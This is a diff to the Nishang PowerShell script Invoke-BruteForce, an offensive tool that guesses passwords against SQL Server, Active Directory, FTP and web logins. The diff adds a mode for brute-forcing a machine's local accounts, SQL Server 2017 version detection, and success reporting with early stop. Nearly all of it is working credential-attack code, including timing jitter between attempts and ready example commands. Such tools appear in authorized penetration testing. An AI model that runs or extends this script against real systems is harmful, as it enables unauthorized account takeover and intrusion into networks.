@@ -3,13 +3,13 @@ function Invoke-BruteForce
 {
   <#
 .SYNOPSIS
-Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.
+Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Local Accounts, Web and FTP.
 
 .DESCRIPTION
-This payload can brute force credentials for SQL Server, ActiveDirectory, Web or FTP.
+This payload can brute force credentials for SQL Server, ActiveDirectory, LocalAccounts, Web or FTP.
 
 .PARAMETER Computername
-Specifies a SQL Server, Domain, FTP Site or Web Site.
+Specifies a SQL Server, Domain, Computer, FTP Site or Web Site.
 
 .PARAMETER UserList
 Specify a list of users. If blank, trusted connection will be used for SQL and an error will be genrated for other services.
@@ -18,7 +18,7 @@ Specify a list of users. If blank, trusted connection will be used for SQL and a
 Specify a list of passwords.
 
 .PARAMETER Service
-Enter a Service from SQL, ActiveDirecotry, FTP and Web. Default service is set to SQL.
+Enter a Service from SQL, ActiveDirecotry, LocalAccounts, FTP and Web. Default service is set to SQL.
 
 .PARAMETER StopOnSuccess
 Use this switch to stop the brute forcing on the first success.
@@ -36,6 +36,11 @@ Brute force a SQL Server SQLServ01 for users listed in users.txt and passwords i
 .EXAMPLE
 PS > Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose
 Brute force a Domain Controller of targetdomain.com for users listed in users.txt and passwords in wordlist.txt.
+Since StopOnSuccess is specified, the brute forcing stops on first success.
+
+.EXAMPLE
+PS > Invoke-BruteForce -ComputerName targetmachine -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service LocalAccounts -StopOnSuccess -Verbose
+Brute force the local mahcine for local users listed in users.txt and passwords in wordlist.txt.
 Since StopOnSuccess is specified, the brute forcing stops on first success.
 
 .EXAMPLE
@@ -66,7 +71,7 @@ Goude 2012, TreuSec
         [String]
         $PasswordList,
 
-        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
+        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","LocalAccounts","Web")]
         [String]
         $Service = "SQL",
 
@@ -128,10 +133,11 @@ Goude 2012, TreuSec
                     { $_ -match "^11" } { "SQL Server 2012";Break UsernameLoop }
                     { $_ -match "^12" } { "SQL Server 2014";Break UsernameLoop }
                     { $_ -match "^13" } { "SQL Server 2016";Break UsernameLoop }
+                    { $_ -match "^14" } { "SQL Server 2017";Break UsernameLoop }
                     Default { "Unknown" }
                 }
             }
-
+            $Connection.Close()
             # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         }
@@ -146,7 +152,15 @@ Goude 2012, TreuSec
                     {
                         $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
                         Write-Verbose "Checking $userName : $password"
-                        CheckForSQLSuccess
+                        $success = CheckForSQLSuccess
+                        if ($success)
+                        {
+                            Write-Output "Match found! $username : $password"
+                            if ($StopOnSuccess)
+                            {
+                                break UsernameLoop
+                            }
+                        }
                     }
                 }
             }
@@ -205,11 +219,19 @@ Goude 2012, TreuSec
         }
 
         #Brute Force Active Directory
-        elseif ($service -eq "ActiveDirectory")
+        elseif ($service -eq "ActiveDirectory" -or $service -eq "LocalAccounts")
         {
-            Write-Output "Brute Forcing Active Directory $ComputerName"
+	    if ($service -eq "ActiveDirectory")
+	    {
+	        Write-Output "Brute Forcing Active Directory $ComputerName"
+                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+	    }
+	    else
+	    {
+	        Write-Output "Brute Forcing Local Accounts $ComputerName"
+                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
+	    }
             Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-            $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
             Try
             {
                 $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
@@ -303,3 +325,5 @@ Goude 2012, TreuSec
         }
     }
 }
+
+
